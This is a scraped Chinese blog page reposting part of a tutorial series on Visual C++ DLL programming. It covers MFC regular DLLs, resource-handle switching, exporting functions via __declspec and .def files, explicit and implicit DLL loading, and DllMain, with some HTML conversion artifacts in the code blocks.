
#ifndef __AFXWIN_H__
#error include ’stdafx.h’ before including this file for PCH
#endif
#include &#8220;resource.h&#8221; // main symbols

class CRegularDllApp : public CWinApp
{
　public:
　　CRegularDllApp();
　　DECLARE_MESSAGE_MAP()
};

#endif

// RegularDll.cpp : Defines the initialization routines for the DLL.

#include &#8220;stdafx.h&#8221;
#include &#8220;RegularDll.h&#8221;

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

BEGIN_MESSAGE_MAP(CRegularDllApp, CWinApp)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////

// CRegularDllApp construction

CRegularDllApp::CRegularDllApp()
{
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CRegularDllApp object

CRegularDllApp theApp;</td>
</tr>
</table>


<p>　　分析：</p>

<p>　　在这一组文件中定义了一个继承自CWinApp的类CRegularDllApp，并同时定义了其的一个实例theApp。乍一看，您会以为它是一个MFC应用程序，因为MFC应用程序也包含这样的在工程名后添加“App”组成类名的类（并继承自CWinApp类），也定义了这个类的一个全局实例theApp。</p>

<p>　　我们知道，在MFC应用程序中CWinApp取代了SDK程序中WinMain的地位，SDK程序WinMain所完成的工作由CWinApp的三个函数完成：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>virtual BOOL InitApplication( );virtual BOOL InitInstance( );virtual BOOL Run( ); //传说中MFC程序的“活水源头”</td>
</tr>
</table>


<p>　　但是MFC规则DLL并不是MFC应用程序，它所继承自CWinApp的类不包含消息循环。这是因为，MFC规则DLL不包含CWinApp::Run机制，主消息泵仍然由应用程序拥有。如果DLL 生成无模式对话框或有自己的主框架窗口，则应用程序的主消息泵必须调用从DLL 导出的函数来调用PreTranslateMessage成员函数。</p>

<p>　　另外，MFC规则DLL与MFC 应用程序中一样，需要将所有 DLL中元素的初始化放到InitInstance 成员函数中。</p>

<p>　　第二组文件 自定义对话框类声明及实现</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#if !defined(AFX_DLLDIALOG_H__CEA4C6AF_245D_48A6_B11A_A5521EAD7C4E__INCLUDED_)
#define AFX_DLLDIALOG_H__CEA4C6AF_245D_48A6_B11A_A5521EAD7C4E__INCLUDED_#if _MSC_VER &gt; 1000
#pragma once
#endif // _MSC_VER &gt; 1000
// DllDialog.h : header file
/////////////////////////////////////////////////////////////////////////////
// CDllDialog dialogclass CDllDialog : public CDialog
{
　// Construction
　public:
　　CDllDialog(CWnd* pParent = NULL); // standard constructor
　　enum { IDD = IDD_DLL_DIALOG };
　protected:
　　virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV support
　　// Implementation
　protected:
　　afx_msg void OnHelloButton();
　　DECLARE_MESSAGE_MAP()
};
#endif

// DllDialog.cpp : implementation file

#include &#8220;stdafx.h&#8221;
#include &#8220;RegularDll.h&#8221;
#include &#8220;DllDialog.h&#8221;
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CDllDialog dialog

CDllDialog::CDllDialog(CWnd* pParent /*=NULL*/)
: CDialog(CDllDialog::IDD, pParent)
{}

void CDllDialog::DoDataExchange(CDataExchange* pDX)
{
　CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CDllDialog, CDialog)
　ON_BN_CLICKED(IDC_HELLO_BUTTON, OnHelloButton)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDllDialog message handlers

void CDllDialog::OnHelloButton()
{
　MessageBox(&#8220;Hello,pconline的网友&#8221;,&#8221;pconline&#8221;);
}</td>
</tr>
</table>


<p>　　分析：</p>

<p>　　这一部分的编程与一般的应用程序根本没有什么不同，我们照样可以利用MFC类向导来自动为对话框上的控件添加事件。MFC类向导照样会生成类似ON_BN_CLICKED(IDC_HELLO_BUTTON, OnHelloButton)的消息映射宏。</p>

<p>　　第三组文件 DLL中的资源文件</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//// Microsoft Developer Studio generated include file.// Used by RegularDll.rc

//

#define IDD_DLL_DIALOG 1000

#define IDC_HELLO_BUTTON 1000</td>
</tr>
</table>


<p>　　分析：</p>

<p>　　在MFC规则DLL中使用资源也与在MFC应用程序中使用资源没有什么不同，我们照样可以用Visual C++的资源编辑工具进行资源的添加、删除和属性的更改。</p>

<p>　　第四组文件 MFC规则DLL接口函数</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#include &#8220;StdAfx.h&#8221;
#include &#8220;DllDialog.h&#8221;extern &#8220;C&#8221; __declspec(dllexport) void ShowDlg(void)
{
　CDllDialog dllDialog;
　dllDialog.DoModal();
}</td>
</tr>
</table>


<p>　　分析：</p>

<p>　　这个接口并不使用MFC，但是在其中却可以调用MFC扩展类CdllDialog的函数，这体现了“规则”的概类。</p>

<p>　　与非MFC DLL完全相同，我们可以使用__declspec(dllexport)声明或在.def中引出的方式导出MFC规则DLL中的接口。</p>

<p>　　5.4 MFC规则DLL的调用</p>

<p>　　笔者编写了如图12的对话框MFC<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>（下载本工程）来调用5.3节的MFC规则DLL，在这个程序的对话框上点击“调用DLL”按钮时弹出5.3节MFC规则DLL中的对话框。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="327" src="http://dev.yesky.com/imagelist/05/10/y661eb38d8t2.jpg" height="201" /><img border="0" width="327" src="http://dev.yesky.com/imagelist/05/10/y661eb38d8t2.jpg" height="201" />
图12 MFC规则DLL的调用例子</td>
</tr>
</table>


<p>　　下面是“调用DLL”按钮单击事件的消息处理函数：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void CRegularDllCallDlg::OnCalldllButton()
{
　typedef void (*lpFun)(void);
　HINSTANCE hDll; //DLL句柄
　hDll = LoadLibrary(&#8220;RegularDll.dll&#8221;);
　if (NULL==hDll)
　{
　　MessageBox(&#8220;DLL加载失败&#8221;);
　}　lpFun addFun; //函数指针
　lpFun pShowDlg = (lpFun)GetProcAddress(hDll,&#8221;ShowDlg&#8221;);
　if (NULL==pShowDlg)
　{
　　MessageBox(&#8220;DLL中函数寻找失败&#8221;);
　}
　pShowDlg();
}</td>
</tr>
</table>


<p>　　上述例子中给出的是显示调用的方式，可以看出，其调用方式与第4节中非MFC DLL的调用方式没有什么不同。</p>

<p>　　我们照样可以在EXE程序中隐式调用MFC规则DLL，只需要将DLL工程生成的.lib文件和.dll文件拷入当前工程所在的目录，并在RegularDllCallDlg.cpp文件（图12所示对话框类的实现文件）的顶部添加：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#pragma comment(lib,&#8221;RegularDll.lib&#8221;)
void ShowDlg(void);</td>
</tr>
</table>


<p>　　并将void CRegularDllCallDlg::OnCalldllButton() 改为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void CRegularDllCallDlg::OnCalldllButton()
{
　ShowDlg();
}</td>
</tr>
</table>


<p>　　5.5 共享MFC DLL的规则DLL的模块切换</p>

<p>　　应用程序进程本身及其调用的每个DLL模块都具有一个全局唯一的HINSTANCE句柄，它们代表了DLL或EXE模块在进程虚拟空间中的起始地址。进程本身的模块句柄一般为0x400000，而DLL模块的缺省句柄为0x10000000。如果程序同时加载了多个DLL，则每个DLL模块都会有不同的HINSTANCE。应用程序在加载DLL时对其进行了重定位。</p>

<p>　　共享MFC DLL（或MFC扩展DLL）的规则DLL涉及到HINSTANCE句柄问题，HINSTANCE句柄对于加载资源特别重要。EXE和DLL都有其自己的资源，而且这些资源的ID可能重复，应用程序需要通过资源模块的切换来找到正确的资源。如果应用程序需要来自于DLL的资源，就应将资源模块句柄指定为DLL的模块句柄；如果需要EXE文件中包含的资源，就应将资源模块句柄指定为EXE的模块句柄。</p>

<p>　　这次我们创建一个动态链接到MFC DLL的规则DLL（下载本工程），在其中包含如图13的对话框。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="376" src="http://dev.yesky.com/imagelist/05/10/qy3n1xcn12i7.jpg" height="219" /><img border="0" width="376" src="http://dev.yesky.com/imagelist/05/10/qy3n1xcn12i7.jpg" height="219" />
图13 DLL中的对话框</td>
</tr>
</table>


<p>　　另外，在与这个DLL相同的工作区中生成一个基于对话框的MFC程序，其对话框与图12完全一样。但是在此工程中我们另外添加了一个如图14的对话框。</p>

<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" width="375" src="http://dev.yesky.com/imagelist/05/10/d5qj203lursc.jpg" height="219" /><img border="0" width="375" src="http://dev.yesky.com/imagelist/05/10/d5qj203lursc.jpg" height="219" />
图14 EXE中的对话框</td>
</tr>
</table>


<p>　　图13和图14中的对话框除了caption不同（以示区别）以外，其它的都相同。</p>

<p>　　尤其值得特别注意，在DLL和EXE中我们对图13和图14的对话框使用了相同的资源ID=2000，在DLL和EXE工程的resource.h中分别有如下的宏：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>//DLL中对话框的ID#define IDD_DLL_DIALOG 2000//EXE中对话框的ID

#define IDD_EXE_DIALOG 2000</td>
</tr>
</table>


<p>　　与5.3节静态链接MFC DLL的规则DLL相同，我们还是在规则DLL中定义接口函数ShowDlg，原型如下：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#include &#8220;StdAfx.h&#8221;
#include &#8220;SharedDll.h&#8221;void ShowDlg(void)
{
　CDialog dlg(IDD_DLL_DIALOG); //打开ID为2000的对话框
　dlg.DoModal();
}</td>
</tr>
</table>


<p>　　而为应用工程主对话框的“调用DLL”的单击事件添加如下消息处理函数：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void CSharedDllCallDlg::OnCalldllButton()
{
　ShowDlg();
}</td>
</tr>
</table>


<p>　　我们以为单击“调用DLL”会弹出如图13所示DLL中的对话框，可是可怕的事情发生了，我们看到是图14所示EXE中的对话框！</p>

<p>　　惊讶？</p>

<p>　　产生这个问题的根源在于应用<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>与MFC规则DLL共享MFC DLL（或MFC扩展DLL）的程序总是默认使用EXE的资源，我们必须进行资源模块句柄的切换，其实现方法有三：</p>

<p>　　方法一 在DLL接口函数中使用：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>AFX_MANAGE_STATE(AfxGetStaticModuleState());</td>
</tr>
</table>


<p>　　我们将DLL中的接口函数ShowDlg改为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void ShowDlg(void)
{
　//方法1:在函数开始处变更，在函数结束时恢复
　//将AFX_MANAGE_STATE(AfxGetStaticModuleState());作为接口函数的第一//条语句进行模块状态切换　AFX_MANAGE_STATE(AfxGetStaticModuleState());
　CDialog dlg(IDD_DLL_DIALOG);//打开ID为2000的对话框
　dlg.DoModal();
}</td>
</tr>
</table>


<p>　　这次我们再点击EXE程序中的“调用DLL”按钮，弹出的是DLL中的如图13的对话框！嘿嘿，弹出了正确的对话框资源。</p>

<p>　　AfxGetStaticModuleState是一个函数，其原型为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td height="21">AFX_MODULE_STATE* AFXAPI AfxGetStaticModuleState( );</td>
</tr>
</table>


<p>　　该函数的功能是在栈上（这意味着其作用域是局部的）创建一个AFX_MODULE_STATE类（模块全局数据也就是模块状态）的实例，对其进行设置，并将其指针pModuleState返回。</p>

<p>　　AFX_MODULE_STATE类的原型如下：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>// AFX_MODULE_STATE (global data for a module)class AFX_MODULE_STATE : public CNoTrackObject
{
　public:
　　#ifdef _AFXDLL
　　　AFX_MODULE_STATE(BOOL bDLL, WNDPROC pfnAfxWndProc, DWORD dwVersion);
　　　AFX_MODULE_STATE(BOOL bDLL, WNDPROC pfnAfxWndProc, DWORD dwVersion,BOOL bSystem);
　　#else
　　　AFX_MODULE_STATE(BOOL bDLL);
　　#endif
　　~AFX_MODULE_STATE();　　CWinApp* m_pCurrentWinApp;
　　HINSTANCE m_hCurrentInstanceHandle;
　　HINSTANCE m_hCurrentResourceHandle;
　　LPCTSTR m_lpszCurrentAppName;

　　… //省略后面的部分
}</td>
</tr>
</table>


<p>　　AFX_MODULE_STATE类利用其构造函数和析构函数进行存储模块状态现场及恢复现场的工作，类似汇编中call指令对pc指针和sp寄存器的保存与恢复、中断服务程序的中断现场压栈与恢复以及<a target="_blank" href="http://os.yesky.com/" class="bluekey"><font color="#003399">操作系统</font></a>线程调度的任务控制块保存与恢复。</p>

<p>　　许多看似不着边际的知识点居然有惊人的相似！</p>

<p>　　AFX_MANAGE_STATE是一个宏，其原型为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>AFX_MANAGE_STATE( AFX_MODULE_STATE* pModuleState )</td>
</tr>
</table>


<p>　　该宏用于将pModuleState设置为当前的有效模块状态。当离开该宏的作用域时（也就离开了pModuleState所指向栈上对象的作用域），先前的模块状态将由AFX_MODULE_STATE的析构函数恢复。</p>

<p>　　方法二 在DLL接口函数中使用：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>AfxGetResourceHandle();AfxSetResourceHandle(HINSTANCE xxx);</td>
</tr>
</table>


<p>　　AfxGetResourceHandle用于获取当前资源模块句柄，而AfxSetResourceHandle则用于设置程序目前要使用的资源模块句柄。</p>

<p>　　我们将DLL中的接口函数ShowDlg改为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void ShowDlg(void)
{
　//方法2的状态变更
　HINSTANCE save_hInstance = AfxGetResourceHandle();
　AfxSetResourceHandle(theApp.m_hInstance);
　CDialog dlg(IDD_DLL_DIALOG);//打开ID为2000的对话框
　dlg.DoModal();　//方法2的状态还原
　AfxSetResourceHandle(save_hInstance);
}</td>
</tr>
</table>


<p>　　通过AfxGetResourceHandle和AfxSetResourceHandle的合理变更，我们能够灵活地设置程序的资源模块句柄，而方法一则只能在DLL接口函数退出的时候才会恢复模块句柄。方法二则不同，如果将ShowDlg改为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>extern CSharedDllApp theApp; //需要声明theApp外部全局变量void ShowDlg(void)
{
　//方法2的状态变更
　HINSTANCE save_hInstance = AfxGetResourceHandle();
　AfxSetResourceHandle(theApp.m_hInstance);　CDialog dlg(IDD_DLL_DIALOG);//打开ID为2000的对话框
　dlg.DoModal();

　//方法2的状态还原

　AfxSetResourceHandle(save_hInstance);

　//使用方法2后在此处再进行操作针对的将是应用程序的资源

　CDialog dlg1(IDD_DLL_DIALOG); //打开ID为2000的对话框
　dlg1.DoModal();
}</td>
</tr>
</table>


<p>　　在应用程序主对话框的“调用DLL”按钮上点击，将看到两个对话框，相继为DLL中的对话框（图13）和EXE中的对话框（图14）。</p>

<p>　　方法三 由应用程序自身切换</p>

<p>　　资源模块的切换除了可以由DLL接口函数完成以外，由应用程序自身也能完成（下载本工程）。</p>

<p>　　现在我们把DLL中的接口函数改为最简单的：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void ShowDlg(void)
{
　CDialog dlg(IDD_DLL_DIALOG); //打开ID为2000的对话框
　dlg.DoModal();
}</td>
</tr>
</table>


<p>　　而将应用程序的OnCalldllButton函数改为：</p>

<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>void CSharedDllCallDlg::OnCalldllButton()
{
　//方法3：由应用程序本身进行状态切换
　//获取EXE模块句柄　HINSTANCE exe_hInstance = GetModuleHandle(NULL);　//或者HINSTANCE exe_hInstance = AfxGetResourceHandle();
　//获取DLL模块句柄

　HINSTANCE dll_hInstance = GetModuleHandle(&#8220;SharedDll.dll&#8221;);
　AfxSetResourceHandle(dll_hInstance); //切换状态
　ShowDlg(); //此时显示的是DLL的对话框
　AfxSetResourceHandle(exe_hInstance); //恢复状态

　//资源模块恢复后再调用ShowDlg
　ShowDlg(); //此时显示的是EXE的对话框
}</td>
</tr>
</table>


<p>　　方法三中的Win32函数GetModuleHandle可以根据DLL的文件名获取DLL的模块句柄。如果需要得到EXE模块的句柄，则应调用带有Null参数的GetModuleHandle。</p>

<p>　　方法三与方法二的不同在于方法三是在应用程序中利用AfxGetResourceHandle和AfxSetResourceHandle进行资源模块句柄切换的。同样地，在应用程序主对话框的“调用DLL”按钮上点击，也将看到两个对话框，相继为DLL中的对话框（图13）和EXE中的对话框（图14）。</p>

<p>　　在下一节我们将对MFC扩展DLL进行详细分析和实例讲解，欢迎您继续关注本系列连载。</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-04-05T15:01:46+08:00" pubdate data-updated="true">2008-04-05</time></div>
	

<div class="tags">

	<a class='category' href='/blog/categories/zhuan-zai/'>转载</a>

</div>


	
		<span class="comments"><a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-san//posts/22/index.html#disqus_thread">Comments</a></span>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/blog/2008/04/05/visual-Visual-C-dong-tai-lian-jie-ku-bian-cheng-er/">
		
			Visual C++动态链接库编程（二）</a>
	</h2>
	<div class="entry-content">
		<p>　　4.1一个简单的DLL</p>

<p>　　第2节给出了以静态链接库方式提供add函数接口的方法，接下来我们来看看怎样用动态链接库实现一个同样功能的add函数。</p>

<p class="guanggao">　　如图6，在VC++中new一个Win32 Dynamic-Link Library工程dllTest（<a target="_blank" href="http://www.mydown.com/code/244/244551.html"><font color="#000000">单击此处下载本工程</font></a>）。注意不要选择MFC AppWizard(dll)，因为用MFC AppWizard(dll)建立的将是第5、6节要讲述的MFC 动态链接库。</p>




<p><p class="guanggao">
<table border="0" align="center" width="90%">
<tr>
<td>
<p align="center"><img border="0" src="http://dev.yesky.com/imagelist/05/10/z197lah23li0.jpg" />
图6 建立一个非MFC DLL</td>
</tr>
</table>
<p class="guanggao">
　　在建立的工程中添加lib.h及lib.cpp文件，源代码如下：
<p class="guanggao">
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>/<em> 文件名：lib.h　</em>/</p>

<h1>ifndef LIB_H</h1>

<h1>define LIB_H</h1>

<p>extern &ldquo;C&rdquo; int __declspec(dllexport)add(int x, int y);</p>

<h1>endif</h1>

<p>/<em> 文件名：lib.cpp　</em>/</p>

<h1>include &ldquo;lib.h&rdquo;</h1>

<p>int add(int x, int y)
{
　return x + y;
}</td>
</tr>
</table>
<p class="guanggao">
　　与第2节对静态链接库的调用相似，我们也建立一个与DLL工程处于同一工作区的应用工程dllCall，它调用DLL中的函数add，其源代码如下：
<p class="guanggao">
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#include &lt;stdio.h&gt;</p>

<h1>include &lt;windows.h&gt;</h1>

<p>typedef int(<em>lpAddFun)(int, int); //宏定义函数指针类型
int main(int argc, char </em>argv[])
{
　HINSTANCE hDll; //DLL句柄
　lpAddFun addFun; //函数指针
　hDll = LoadLibrary(&ldquo;..\Debug\dllTest.dll&rdquo;);
　if (hDll != NULL)
　{
　　addFun = (lpAddFun)GetProcAddress(hDll, &ldquo;add&rdquo;);
　　if (addFun != NULL)
　　{
　　　int result = addFun(2, 3);
　　　printf(&ldquo;%d&rdquo;, result);
　　}
　　FreeLibrary(hDll);
　}
　return 0;
}</td>
</tr>
</table>
<p class="guanggao">
　　分析上述代码，dllTest工程中的lib.cpp文件与第2节静态链接库版本完全相同，不同在于lib.h对函数add的声明前面添加了__declspec(dllexport)语句。这个语句的含义是声明函数add为DLL的导出函数。DLL内的函数分为两种：</p>

<p>　　(1)DLL导出函数，可供应用<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>调用；</p>

<p>　　(2) DLL内部函数，只能在DLL程序使用，应用程序无法调用它们。</p>

<p>　　而应用程序对本DLL的调用和对第2节静态链接库的调用却有较大差异，下面我们来逐一分析。</p>

<p>　　首先，语句typedef int ( * lpAddFun)(int,int)定义了一个与add函数接受参数类型和返回值均相同的函数指针类型。随后，在main函数中定义了lpAddFun的实例addFun；</p>

<p>　　其次，在函数main中定义了一个DLL HINSTANCE句柄实例hDll，通过Win32 Api函数LoadLibrary动态加载了DLL模块并将DLL模块句柄赋给了hDll；</p>

<p>　　再次，在函数main中通过Win32 Api函数GetProcAddress得到了所加载DLL模块中函数add的地址并赋给了addFun。经由函数指针addFun进行了对DLL中add函数的调用；</p>

<p>　　最后，应用工程使用完DLL后，在函数main中通过Win32 Api函数FreeLibrary释放了已经加载的DLL模块。</p>

<p>　　通过这个简单的例子，我们获知DLL定义和调用的一般概念：</p>

<p>　　(1)DLL中需以某种特定的方式声明导出函数（或变量、类）；</p>

<p>　　(2)应用工程需以某种特定的方式调用DLL的导出函数（或变量、类）。</p>

<p>　　下面我们来对“特定的方式进行”阐述。</p>

<p>　　4.2 声明导出函数</p>

<p>　　DLL中导出函数的声明有两种方式：一种为4.1节例子中给出的在函数声明中加上__declspec(dllexport)，这里不再举例说明；另外一种方式是采用模块定义(.def) 文件声明，.def文件为链接器提供了有关被链接程序的导出、属性及其他方面的信息。</p>

<p>　　下面的代码演示了怎样同.def文件将函数add声明为DLL导出函数（需在dllTest工程中添加lib.def文件）：
<p class="guanggao">
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>; lib.def : 导出DLL函数</p>

<p>LIBRARY dllTest</p>

<p>EXPORTS</p>

<p>add @ 1</td>
</tr>
</table>
<p class="guanggao">
　　.def文件的规则为：</p>

<p>　　(1)LIBRARY语句说明.def文件相应的DLL；</p>

<p>　　(2)EXPORTS语句后列出要导出函数的名称。可以在.def文件中的导出函数名后加@n，表示要导出函数的序号为n（在进行函数调用时，这个序号将发挥其作用）；</p>

<p>　　(3).def 文件中的注释由每个注释行开始处的分号 (;) 指定，且注释不能与语句共享一行。</p>

<p>　　由此可以看出，例子中lib.def文件的含义为生成名为“dllTest”的动态链接库，导出其中的add函数，并指定add函数的序号为1。</p>

<p>　　4.3 DLL的调用方式</p>

<p>　　在4.1节的例子中我们看到了由“LoadLibrary-GetProcAddress-FreeLibrary”系统Api提供的三位一体“DLL加载-DLL函数地址获取-DLL释放”方式，这种调用方式称为DLL的动态调用。</p>

<p>　　动态调用方式的特点是完全由编程者用 API 函数加载和卸载 DLL，程序员可以决定 DLL 文件何时加载或不加载，显式链接在运行时决定加载哪个 DLL 文件。</p>

<p>　　与动态调用方式相对应的就是静态调用方式，“有动必有静”，这来源于物质世界的对立统一。“动与静”，其对立与统一竟无数次在技术领域里得到验证，譬如静态IP与DHCP、静态路由与动态路由等。从前文我们已经知道，库也分为静态库与动态库DLL，而想不到，深入到DLL内部，其调用方式也分为静态与动态。“动与静”，无处不在。《周易》已认识到有动必有静的动静平衡观，《易．系辞》曰：“动静有常，刚柔断矣”。哲学意味着一种普遍的真理，因此，我们经常可以在枯燥的技术领域看到哲学的影子。</p>

<p>　　静态调用方式的特点是由编译系统完成对DLL的加载和应用程序结束时 DLL 的卸载。当调用某DLL的应用程序结束时，若系统中还有其它程序使用该 DLL，则Windows对DLL的应用记录减1，直到所有使用该DLL的程序都结束时才释放它。静态调用方式简单实用，但不如动态调用方式灵活。</p>

<p>　　下面我们来看看静态调用的例子（<a target="_blank" href="http://www.mydown.com/code/244/244556.html"><font color="#0000ff">单击此处下载本工程</font></a>），将编译dllTest工程所生成的.lib和.dll文件拷入dllCall工程所在的路径，dllCall执行下列代码：
<p class="guanggao">
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#pragma comment(lib,&ldquo;dllTest.lib&rdquo;)</p>

<p>//.lib文件中仅仅是关于其对应DLL文件中函数的重定位信息</p>

<p>extern &ldquo;C&rdquo; __declspec(dllimport) add(int x,int y);</p>

<p>int main(int argc, char* argv[])
{
　int result = add(2,3);
　printf(&ldquo;%d&rdquo;,result);
　return 0;
}</td>
</tr>
</table>
<p class="guanggao">
　　由上述代码可以看出，静态调用方式的顺利进行需要完成两个动作：</p>

<p>　　(1)告诉编译器与DLL相对应的.lib文件所在的路径及文件名，#pragma comment(lib,&ldquo;dllTest.lib&rdquo;)就是起这个作用。</p>

<p>　　程序员在建立一个DLL文件时，连接器会自动为其生成一个对应的.lib文件，该文件包含了DLL 导出函数的符号名及序号（并不含有实际的代码）。在应用程序里，.lib文件将作为DLL的替代文件参与编译。</p>

<p>　　(2)声明导入函数，extern &ldquo;C&rdquo; <strong>declspec(dllimport) add(int x,int y)语句中的</strong>declspec(dllimport)发挥这个作用。</p>

<p>　　静态调用方式不再需要使用系统API来加载、卸载DLL以及获取DLL中导出函数的地址。这是因为，当程序员通过静态链接方式编译生成应用程序时，应用程序中调用的与.lib文件中导出符号相匹配的函数符号将进入到生成的EXE 文件中，.lib文件中所包含的与之对应的DLL文件的文件名也被编译器存储在 EXE文件内部。当应用程序运行过程中需要加载DLL文件时，Windows将根据这些信息发现并加载DLL，然后通过符号名实现对DLL 函数的动态链接。这样，EXE将能直接通过函数名调用DLL的输出函数，就象调用程序内部的其他函数一样。</p>

<p><p class="guanggao">　　4.4 DllMain函数</p>

<p>　　Windows在加载DLL的时候，需要一个入口函数，就如同控制台或DOS<a target="_blank" href="http://dev.yesky.com/" class="bluekey"><font color="#003399">程序</font></a>需要main函数、WIN32程序需要WinMain函数一样。在前面的例子中，DLL并没有提供DllMain函数，应用工程也能成功引用DLL，这是因为Windows在找不到DllMain的时候，系统会从其它运行库中引入一个不做任何操作的缺省DllMain函数版本，并不意味着DLL可以放弃DllMain函数。</p>

<p>　　根据编写规范，Windows必须查找并执行DLL里的DllMain函数作为加载DLL的依据，它使得DLL得以保留在内存里。这个函数并不属于导出函数，而是DLL的内部函数。这意味着不能直接在应用工程中引用DllMain函数，DllMain是自动被调用的。</p>

<p>　　我们来看一个DllMain函数的例子（<a target="_blank" href="http://www.mydown.com/code/244/244555.html"><font color="#0000ff">单击此处下载本工程</font></a>）。
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
　switch (ul_reason_for_call)
　{
　　case DLL_PROCESS_ATTACH:
　　　printf(&ldquo;\nprocess attach of dll&rdquo;);
　　　break;
　　case DLL_THREAD_ATTACH:
　　　printf(&ldquo;\nthread attach of dll&rdquo;);
　　　break;
　　case DLL_THREAD_DETACH:
　　　printf(&ldquo;\nthread detach of dll&rdquo;);
　　　break;
　　case DLL_PROCESS_DETACH:
　　　printf(&ldquo;\nprocess detach of dll&rdquo;);
　　　break;
　}
　return TRUE;
}</td>
</tr>
</table>
　　DllMain函数在DLL被加载和卸载时被调用，在单个线程启动和终止时，DLLMain函数也被调用，ul_reason_for_call指明了被调用的原因。原因共有4种，即PROCESS_ATTACH、PROCESS_DETACH、THREAD_ATTACH和THREAD_DETACH，以switch语句列出。</p>

<p>　　来仔细解读一下DllMain的函数头BOOL APIENTRY DllMain( HANDLE hModule, WORD ul_reason_for_call, LPVOID lpReserved )。</p>

<p>　　APIENTRY被定义为__stdcall，它意味着这个函数以标准Pascal的方式进行调用，也就是WINAPI方式；</p>

<p>　　进程中的每个DLL模块被全局唯一的32字节的HINSTANCE句柄标识，只有在特定的进程内部有效，句柄代表了DLL模块在进程虚拟空间中的起始地址。在Win32中，HINSTANCE和HMODULE的值是相同的，这两种类型可以替换使用，这就是函数参数hModule的来历。</p>

<p>　　执行下列代码：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>hDll = LoadLibrary(&ldquo;..\Debug\dllTest.dll&rdquo;);
if (hDll != NULL)
{
　addFun = (lpAddFun)GetProcAddress(hDll, MAKEINTRESOURCE(1));
　//MAKEINTRESOURCE直接使用导出文件中的序号
　if (addFun != NULL)
　{
　　int result = addFun(2, 3);
　　printf(&ldquo;\ncall add in dll:%d&rdquo;, result);
　}
　FreeLibrary(hDll);
}</td>
</tr>
</table>
　　我们看到输出顺序为：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>process attach of dll
call add in dll:5
process detach of dll</td>
</tr>
</table>
　　这一输出顺序验证了DllMain被调用的时机。</p>

<p>　　代码中的GetProcAddress ( hDll, MAKEINTRESOURCE ( 1 ) )值得留意，它直接通过.def文件中为add函数指定的顺序号访问add函数，具体体现在MAKEINTRESOURCE ( 1 )，MAKEINTRESOURCE是一个通过序号获取函数名的宏，定义为（节选自winuser.h）：
<table border="1" bgColor="#e3e3e3" align="center" width="90%" borderColor="#cccccc">
<tr>
<td>#define MAKEINTRESOURCEA(i) (LPSTR)((DWORD)((WORD)(i)))</p>

<h1>define MAKEINTRESOURCEW(i) (LPWSTR)((DWORD)((WORD)(i)))</h1>

<h1>ifdef UNICODE</h1>

<h1>define MAKEINTRESOURCE MAKEINTRESOURCEW</h1>

